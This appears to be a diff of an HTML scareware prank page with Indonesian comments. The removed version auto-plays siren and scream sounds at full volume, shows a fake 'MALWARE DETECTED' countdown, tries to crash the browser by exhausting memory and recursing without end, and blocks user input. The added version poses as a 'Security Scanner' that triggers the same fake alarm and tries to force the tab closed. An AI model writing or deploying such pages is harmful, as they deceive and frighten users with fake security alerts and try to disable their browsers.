@@ -1,160 +1,116 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>Security Scan</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; cursor: none !important; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             background: #000; 
             color: #ff0000; 
             font-family: Arial; 
-            overflow: hidden;
             height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
         }
-        .panic { animation: panic 0.1s infinite; }
-        @keyframes panic {
-            0% { background: #ff0000; transform: scale(1) rotate(0deg); }
-            25% { background: #0000ff; transform: scale(1.2) rotate(5deg); }
-            50% { background: #00ff00; transform: scale(0.8) rotate(-5deg); }
-            75% { background: #ffff00; transform: scale(1.1) rotate(3deg); }
-            100% { background: #ff0000; transform: scale(1) rotate(0deg); }
+        button {
+            padding: 20px 40px;
+            font-size: 24px;
+            background: #00ff00;
+            color: black;
+            border: none;
+            cursor: pointer;
+            margin: 20px;
         }
     </style>
 </head>
-<body class="panic">
-    <div style="display: none;">
-        <!-- Audio elements -->
-        <audio id="alarm" loop>
-            <source src="https://assets.mixkit.co/sfx/preview/mixkit-emergency-alert-siren-2907.mp3" type="audio/mp3">
-        </audio>
-        <audio id="scream">
-            <source src="https://assets.mixkit.co/sfx/preview/mixkit-horror-scream-2836.mp3" type="audio/mp3">
-        </audio>
-        <audio id="explosion">
-            <source src="https://assets.mixkit.co/sfx/preview/mixkit-bomb-explosion-in-the-air-2801.mp3" type="audio/mp3">
-        </audio>
-        <audio id="static" loop>
-            <source src="https://assets.mixkit.co/sfx/preview/mixkit-static-radio-2797.mp3" type="audio/mp3">
-        </audio>
+<body>
+    <div>
+        <h1>SECURITY SCANNER</h1>
+        <p>Click button to start system scan</p>
+        <button onclick="startPanic()">START SCAN</button>
     </div>
 
+    <!-- AUDIO ELEMENTS -->
+    <audio id="alarm" loop>
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-emergency-alert-siren-2907.mp3" type="audio/mp3">
+    </audio>
+    <audio id="scream">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-woman-scream-1172.mp3" type="audio/mp3">
+    </audio>
+    <audio id="static" loop>
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-static-radio-2797.mp3" type="audio/mp3">
+    </audio>
+
     <script>
-        // Function to play sound dengan volume maksimal
-        function playSound(audioId, volume = 1.0) {
-            const audio = document.getElementById(audioId);
-            if (audio) {
-                audio.volume = volume;
-                audio.play().catch(e => console.log('Audio play failed:', e));
-            }
-        }
-
-        // Function untuk crash browser
-        function crashBrowser() {
-            // Coba berbagai metode crash
-            try {
-                // Method 1: Infinite loop memory consumption
-                const hugeArray = [];
-                while(true) {
-                    hugeArray.push(new Array(1000000).fill('CRASH'));
-                }
-            } catch(e) {
-                // Method 2: Recursive function call
-                function crash() { crash(); }
-                crash();
-            }
-        }
-
-        // Function untuk close browser/tab
-        function closeBrowser() {
-            // Coba close window
-            window.open('', '_self', '');
-            window.close();
+        function startPanic() {
+            // MAIN SOUND - VOLUME MAX!
+            const alarm = document.getElementById('alarm');
+            const scream = document.getElementById('scream');
+            const staticSound = document.getElementById('static');
             
-            // Redirect ke about:blank berkali-kali
-            for(let i = 0; i < 10; i++) {
-                window.location.href = 'about:blank';
-            }
-        }
-
-        // MAIN EXECUTION - LANGSUNG JALAN SAAT PAGE LOAD
-        window.onload = function() {
-            // MAIN VOLUME KEKERASAN!
-            playSound('alarm', 1.0);
-            playSound('static', 1.0);
+            // Set volume ke maksimal
+            alarm.volume = 1.0;
+            scream.volume = 1.0;
+            staticSound.volume = 1.0;
             
-            // Tunggu 0.5 detik, mainkan scream dan explosion
+            // Play semua sound
+            alarm.play();
+            staticSound.play();
+            
+            // Scream setelah 1 detik
             setTimeout(() => {
-                playSound('scream', 1.0);
-                playSound('explosion', 1.0);
-            }, 500);
+                scream.play();
+            }, 1000);
 
-            // Tampilkan pesan panik
+            // Ganti screen jadi panic mode
             document.body.innerHTML = `
                 <div style="
-                    position: fixed;
-                    top: 0;
-                    left: 0;
+                    background: #ff0000;
                     width: 100%;
                     height: 100%;
                     display: flex;
                     flex-direction: column;
                     justify-content: center;
                     align-items: center;
-                    text-align: center;
-                    z-index: 10000;
+                    color: white;
+                    font-size: 48px;
+                    animation: flash 0.1s infinite;
                 ">
-                    <h1 style="font-size: 60px; animation: panic 0.1s infinite;">💀 MALWARE DETECTED 💀</h1>
-                    <p style="font-size: 30px; margin: 20px;">SYSTEM CRASH IMMINENT</p>
-                    <p style="font-size: 20px;" id="countdown">5</p>
+                    <h1>🚨 MALWARE DETECTED! 🚨</h1>
+                    <p style="font-size: 24px; margin-top: 20px;">SYSTEM COMPROMISED</p>
                 </div>
+                <style>
+                    @keyframes flash {
+                        0% { background: #ff0000; }
+                        50% { background: #0000ff; }
+                        100% { background: #ff0000; }
+                    }
+                </style>
             `;
 
-            // Countdown lalu crash
-            let count = 5;
-            const countdown = setInterval(() => {
-                count--;
-                document.getElementById('countdown').textContent = count;
-                
-                if (count <= 0) {
-                    clearInterval(countdown);
-                    
-                    // Coba crash browser
-                    try {
-                        crashBrowser();
-                    } catch(e) {
-                        // Jika crash gagal, coba close
-                        closeBrowser();
-                    }
-                }
-            }, 1000);
-
-            // Backup: Force close setelah 8 detik
+            // Coba crash browser setelah 5 detik
             setTimeout(() => {
-                window.open('', '_self', '');
-                window.close();
-                // Force redirect ke blank page berkali-kali
-                for(let i = 0; i < 20; i++) {
-                    window.location.href = 'about:blank';
+                // Method crash
+                try {
+                    window.open('', '_self', '');
+                    window.close();
+                    for(let i = 0; i < 10; i++) {
+                        window.location.href = 'about:blank';
+                    }
+                } catch(e) {
+                    console.log('Browser protected');
                 }
-            }, 8000);
-        };
+            }, 5000);
+        }
 
-        // Juga jalankan saat page mulai load (sebelum selesai)
-        document.addEventListener('DOMContentLoaded', function() {
-            // Play sound langsung
-            playSound('alarm', 1.0);
-        });
-
-        // Block semua user interaction
-        document.addEventListener('keydown', (e) => {
-            e.preventDefault();
-        });
-        document.addEventListener('click', (e) => {
-            e.preventDefault();
-        });
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-        });
+        // Auto start setelah 10 detik
+        setTimeout(() => {
+            if (confirm('Security scan detected malware! Start emergency protocol?')) {
+                startPanic();
+            }
+        }, 10000);
     </script>
 </body>
 </html>
